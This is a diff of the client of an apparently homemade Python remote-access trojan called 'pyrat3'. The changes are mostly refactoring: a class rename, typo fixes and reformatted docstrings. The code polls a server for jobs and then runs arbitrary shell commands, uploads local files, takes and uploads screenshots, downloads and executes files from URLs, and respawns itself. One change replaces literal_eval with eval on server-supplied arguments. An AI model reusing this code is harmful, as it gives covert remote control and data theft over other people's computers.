@@ -71,9 +71,7 @@ class Client:
             "country": self.country,
         }
 
-        self.headers = requests.utils.default_headers().update(
-            {"User-Agent": "Pyrat Client 3.0"}
-        )
+        self.headers = requests.utils.default_headers().update({"User-Agent": "pyrat3"})
         # client_id to be set after registration or validation as know client
         self.client_id = None
 
@@ -101,8 +99,8 @@ class Client:
         status_message = get_status.json()["message"]
         self.client_id = get_status.json()["client_id"]
         status_code = get_status.status_code
-        print(f'Client ID: {self.client_id}')
-        print(f'Client status: {status_message} ({status_code})')
+        print(f"Client ID: {self.client_id}")
+        print(f"Client status: {status_message} ({status_code})")
         if status_code == 400:
             raise RuntimeError("Unable to register client")
 
@@ -110,12 +108,12 @@ class Client:
 
         """
         Function used to send data to server. Necessary is to specify data to be send.
-        In one function call is possible,  to make two requests: one for a text-data (dict)
-        and second for object via POST multipart/form-data form.
-        :param data: Data delivered to server; for REST-API communication, it should be a dict.
-        Obligatory parameter.
-        :param args: Only args[0] will be considered. Reserved for file uploading to server.
-        It should be object (for example image).
+        In one function call is possible,  to make two requests: one for a text-data
+        (dict) and second for object via POST multipart/form-data form.
+        :param data: Data delivered to server; for REST-API communication, it should be
+        a dict. Obligatory parameter.
+        :param args: Only args[0] will be considered. Reserved for file uploading to
+        server. It should be object (for example image).
         :return: Response from server in JSON format.
         """
 
@@ -137,19 +135,20 @@ class Client:
         return say_give.json()
 
 
-class Command:
+class AvailableJobs:
 
     """
-    Each function should return data contains specify values: job_id and current date and time.
-    It's important on server side to specify current status of client (WORKING, IDDLE, OFFLINE).
-    Returned object must be a dict with {'confirmation': value} pair (where value is a string)
+    Each function should return data contains specify values: job_id and current
+    date and time. It's important on server side to specify current status of client
+    (WORKING, IDDLE, OFFLINE). Returned object must be a dict with {'confirmation': value}
+    pair (where value is a string)
     """
 
     def __init__(self, client, job_id):
         self.client = client
         self.job_id = job_id
 
-    # Dekorator, zeby zwracany wynik byl zawsze w takiej samej formie
+    # TODO: decorator for make writing of new jobs(arguments) much easier
 
     def popup(self, title, text):
 
@@ -167,7 +166,7 @@ class Command:
         if messagebox.showinfo(text, title):
             r_window.destroy()
         confirmation = (
-            f"[{self.job_id}] [SUCESS] ({curr_datetime()}) \nMessagebox showed"
+            f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \nMessagebox showed"
         )
         return {"confirmation": confirmation}
 
@@ -179,13 +178,14 @@ class Command:
         :param kwargs: Dict with main command and additional parameters.
         :return: Dict with result as string.
 
-        Each arg is attached to list (because subprocess can be called with list or string as command).
-        If terminal == True, command is called via subprocess.check_output (to get command output as string).
-        Each output from cmd.exe must be decoded according to system codepage to keep all standard characters
-        and whitespace characters.
-        If command is called directly (terminal == False), subprocess.Popen is used. There is no output
-        from called command.
-        For both methods, exception will be cached, if command or executable file is not recognized/not exists.
+        Each arg is attached to list (because subprocess can be called with
+        list or string as command). If terminal == True, command is called via
+        subprocess.check_output (to get command output as string).
+        Each output from cmd.exe must be decoded according to system codepage to
+        keep all standard characters and whitespace characters. If command is
+        called directly (terminal == False), subprocess.Popen is used. There is
+        no output from called command. For both methods, exception will be cached,
+        if command or executable file is not recognized/not exists.
         """
 
         if kwargs:
@@ -193,7 +193,7 @@ class Command:
             # Add each arg to list
             for key, value in kwargs.items():
                 arg_list.append(value)
-            if terminal is True:
+            if terminal:
                 try:
                     output = subprocess.check_output(
                         arg_list, shell=True, stderr=subprocess.PIPE
@@ -203,7 +203,7 @@ class Command:
                     )
                 except subprocess.CalledProcessError:
                     confirmation = (
-                        f"[{self.job_id}] [FAILED] ({curr_datetime()}) Unknown command"
+                        f"[{self.job_id}] [FAIL] ({curr_datetime()}) Unknown command"
                     )
             else:
                 try:
@@ -211,23 +211,24 @@ class Command:
                         arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                     )
                     confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \n{arg_list[0]} executed"
-                except FileNotFoundError as e:
-                    print(e)
-                    confirmation = f"[{self.job_id}] [FAILED] ({curr_datetime()}) Executable file not found"
+                except FileNotFoundError:
+                    confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) Executable file not found"
             return {"confirmation": confirmation}
         else:
-            confirmation = f"[{self.job_id}] [FAILED] ({curr_datetime()})"
+            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()})"
             return {"confirmation": confirmation}
 
     def file_upload(self, file_path):
 
         """
         Upload local file to server.
-        :param File_path: Path to requested local file (file, which should be uploaded to server).
+        :param file_path: Path to requested local file (file, which should be
+        uploaded to server).
         :return: Dict with result as string and requested file-object
 
-        Result of function is depending of file existing. If  file exists, there is a dict with result
-        as string, and a file-object returned. If fail, only dict with result is returned.
+        Result of function is depending of file existing. If  file exists, there
+        is a dict with result as string, and a file-object returned. If fail, only
+        dict with result is returned.
         """
 
         try:
@@ -236,25 +237,27 @@ class Command:
                 confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) \nFile {file_path} uploaded"
                 return {"confirmation": confirmation, "file": file}
             else:
-                confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) \nFile {file_path} not exists"
+                confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) \nFile {file_path} not exists"
                 return {"confirmation": confirmation}
         # Catch exception if there is problem with file-read (system file, currently in use etc)
         except IOError:
-            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) \nProblem with access to file {file_path}"
+            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) \nProblem with access to file {file_path}"
             return {"confirmation": confirmation}
 
-    # Fake **kwargs to allow run function with empty kwargs (dict)
     def screenshot(self, **kwargs):
 
         """
         Make screenshot and upload it to server.
-        :param kwargs: Fake args, to unify way of calling methods in main() function.
+        :param kwargs: Fake args, to unify way of calling methods in main()
+        function.
         :return: Dict with result as string and image object.
 
-        To reduce of using external Python modules, screen is captured using self-compilling C# file.
-        Great tool was provided by Vasil Arnaudov (https://github.com/npocmaka).
-        If screen capturing (called using another method within instance) is successful, dictionary with
-        result and file-object wil be returned. Else only dict with result will be returned.
+        To reduce of using external Python modules, screen is captured using
+        self-compiling C# file. Great tool was provided by Vasil Arnaudov
+        (https://github.com/npocmaka). If screen capturing (called using
+        another method within instance) is successful, dictionary with
+        result and file-object wil be returned. Else only dict with result
+        will be returned.
         """
 
         # Get temp dir for current user
@@ -265,7 +268,7 @@ class Command:
             # Save file source as text
             f.write(r.text)
         # Replace all characters, which could generate problems
-        screen_name = "%s.jpg" % (curr_datetime().replace(' ', '_').replace(':', '_'))
+        screen_name = "%s.jpg" % (curr_datetime().replace(" ", "_").replace(":", "_"))
         args_dict = {
             "arg0": "cd",
             "arg1": temp_dir,
@@ -280,7 +283,7 @@ class Command:
         if "SUCCESS" in make_screenshot["confirmation"]:
             return {"confirmation": confirmation, "file": file}
         else:
-            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) Screenshot {screen_name}  was not made"
+            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) Screenshot {screen_name}  was not made"
             return {"confirmation": confirmation}
 
     def file_download(self, url, save_path, execute):
@@ -292,11 +295,11 @@ class Command:
         :param execute: Boolean value (True or False).
         :return: Dict with result as string.
 
-        Get binary object and save it to local machine. Execute downloaded file if 'execute' == True.
-        Return dictionary with result. Catch exception and return information when failure.
+        Get binary object and save it to local machine. Execute downloaded
+        file if 'execute' == True.Return dictionary with result. Catch exception
+        and return information when failure.
         """
-        print('Execute')
-        print(execute)
+
         file_name = url.split("/")[-1]
         # Download file as binary object
         file = requests.get(url, stream=True)
@@ -305,19 +308,24 @@ class Command:
             with open(file_path, "wb") as f:
                 # Save file as binary object
                 shutil.copyfileobj(file.raw, f)
-            if execute is True:
+            if execute:
                 args_dict = {"terminal": False, "args0": file_path}
                 # Call another method within instance
                 self.run_command(**args_dict)
-                confirmation = f"[{self.job_id}] [SUCESS] ({curr_datetime()}) File {url} downloaded, executed"
+                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) File {url} downloaded, executed"
                 return {"confirmation": confirmation}
             else:
-                confirmation = f"[{self.job_id}] [SUCESS] ({curr_datetime()}) File {url} downloaded, not executed"
+                confirmation = f"[{self.job_id}] [SUCCESS] ({curr_datetime()}) File {url} downloaded, not executed"
                 return {"confirmation": confirmation}
-        # Catch exception if there is problem with access to requested location for file save
         except IOError as e:
+
+            """
+            Catch exception if there is problem with access 
+            to requested location for file save
+            """
+
             print(e)
-            confirmation = f"[{self.job_id}] [ERROR] ({curr_datetime()}) File {url} not downloaded and/or not executed"
+            confirmation = f"[{self.job_id}] [FAIL] ({curr_datetime()}) File {url} not downloaded and/or not executed"
             return {"confirmation": confirmation}
 
 
@@ -328,8 +336,8 @@ def main():
     :return: None
 
     First, create object and get script path (for further re-runs of script).
-    Next, try to connect to server and after success, create necessary lists for job_id
-    management.
+    Next, try to connect to server and after success, create necessary lists
+    for job_id management.
     Go to loop and check that there is something to do.
     """
 
@@ -340,11 +348,13 @@ def main():
 
         """
         Connect to a server.
-        :param try_count: Integer; how many repeats script should perform after self-termination
+        :param try_count: Integer; how many repeats script should perform after
+        self-termination
         :return: None
 
-        Calling a function within instance and if expected data will be returned, break the loop.
-        If try_count == 0, execute another instance and kill existing.
+        Calling a function within instance and if expected data will be returned,
+        break the loop. If try_count == 0, execute another instance and kill
+        existing.
         """
 
         print(
@@ -383,7 +393,6 @@ def main():
                     raise SystemExit
                 else:
                     print(f"++++ {fail} ++++")
-                    # print(e)
                     sleep(5)
 
     connect_or_kill(4)
@@ -399,14 +408,16 @@ def main():
         # Fetch data for already registered client
         try:
             get_job = client.get_data()
-        except Exception as e:
+        except Exception:
             subprocess.Popen(["python", script_path])
-            print(f"++++ NEW ITERATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE ++++")
+            print(
+                f"++++ NEW ITERATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE ++++"
+            )
             raise SystemExit
         job = get_job.get("job")
-        # Convert string to bool if key is 'terminal' or 'execute'
+        # Convert string to dict, and next string to bool if key is 'terminal' or 'execute'
         job_args = {
-            k: literal_eval(v) if ("terminal" or "execute") in k else v
+            k: eval(v) if "execute" in k or "terminal" in k else v
             for k, v in literal_eval(get_job.get("job_args")).items()
         }
         job_id = get_job["job_id"]
@@ -414,11 +425,11 @@ def main():
         if job_id not in (received_job_id and sent_job_id):
             try:
                 # Create object
-                command = Command(client, job_id)
+                available_jobs = AvailableJobs(client, job_id)
                 # Search for method in object
-                com_to_run = getattr(command, job)
+                job_to_run = getattr(available_jobs, job)
                 # Run job
-                job_result = com_to_run(**job_args)
+                job_result = job_to_run(**job_args)
                 # Add job_id to list of received jobs
                 received_job_id.append(job_id)
                 client.send_data(
@@ -431,9 +442,7 @@ def main():
             except AttributeError:
                 pass
         # Send information to server, that instance is alive
-        ping = {
-            "last_activity_datetime": strftime("%Y-%m-%d %H:%M:%S", gmtime())
-        }
+        ping = {"last_activity_datetime": strftime("%Y-%m-%d %H:%M:%S", gmtime())}
         client.send_data(ping)
         print(f"++++ END OF ITERATION #{iter_counter} ++++")
         iter_counter += 1
